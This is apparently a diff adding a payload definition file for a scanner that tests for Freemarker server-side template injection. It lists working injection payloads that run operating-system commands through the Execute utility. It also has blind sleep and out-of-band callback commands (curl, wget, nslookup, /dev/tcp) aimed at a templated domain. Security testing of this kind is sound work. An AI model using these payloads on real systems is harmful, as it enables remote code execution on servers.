@@ -1,0 +1,36 @@
+name: Freemarker
+contexts:
+  - begin: "${"
+    end: "}"
+    level: 1
+  - begin: "<#"
+    end: ""
+    level: 1
+  - begin: "<#"
+    end: ">"
+    level: 1
+attack_techniques:
+  - technique: "Render"
+    payloads:
+      - "{{.FirstNum}}*{{.SecondNum}}"
+  - technique: "Exec"
+    payloads:
+      - 'assign ex = "freemarker.template.utility.Execute"?new()>${ ex("{{.Cmd}}")}'
+    commands:
+      - "echo -e {{.FormattedNum}}"
+      - "printf {{.FormattedNum}}"
+  - technique: "Blind Exec Sleep"
+    payloads:
+      - 'assign ex = "freemarker.template.utility.Execute"?new()>${ ex("sleep {{.WaitTime}}")}'
+    expected_response:
+      time: 14
+  - technique: "Blind Exec Pingback"
+    payloads:
+      - 'assign ex = "freemarker.template.utility.Execute"?new()>${ ex("{{.Cmd}}")}'
+    commands:
+      - "ping -c 1 {{.PingDomain}}"
+      - "curl {{.PingDomain}}"
+      - "host {{.PingDomain}}"
+      - "nslookup {{.PingDomain}}"
+      - "wget http://{{.PingDomain}}/ -O /dev/null"
+      - "true < /dev/tcp/{{.PingDomain}}/80"
